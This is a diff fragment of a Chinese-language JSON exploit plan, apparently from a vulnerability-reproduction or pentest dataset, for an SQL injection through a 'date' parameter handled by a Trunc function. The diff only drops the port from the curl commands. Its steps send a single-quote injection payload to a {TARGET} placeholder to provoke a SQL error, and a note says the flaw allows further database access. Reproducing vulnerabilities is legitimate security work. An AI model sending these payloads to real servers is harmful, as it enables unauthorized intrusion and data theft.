@@ -27,19 +27,19 @@
     {
       "step": 1,
       "description": "访问目标网站，确认存在漏洞参数",
-      "command": "curl -s 'http://{TARGET}:8000/?date=minute'",
+      "command": "curl -s 'http://{TARGET}/?date=minute'",
       "expected_result": "返回正常的页面内容，显示每分钟点击次数",
       "notes": "确认目标使用Trunc函数处理date参数"
     },
     {
       "step": 2,
       "description": "发送SQL注入payload触发错误",
-      "command": "curl -s 'http://{TARGET}:8000/?date=xxxx\\'xxxx'",
+      "command": "curl -s 'http://{TARGET}/?date=xxxx\\'xxxx'",
       "expected_result": "返回SQL错误信息，如语法错误或数据库错误",
       "notes": "使用单引号闭合SQL语句触发注入"
     }
   ],
-  "verification_command": "curl -s \"http://{TARGET}:8000/?date=xxxx%27xxxx\"",
+  "verification_command": "curl -s \"http://{TARGET}/?date=xxxx%27xxxx\"",
   "verification_success_sign": "响应中包含SQL错误信息或数据库错误提示",
   "requires_callback": false,
   "callback_note": "此漏洞为SQL注入，不需要目标回连攻击机。可通过SQL注入获取数据库信息或执行进一步操作",
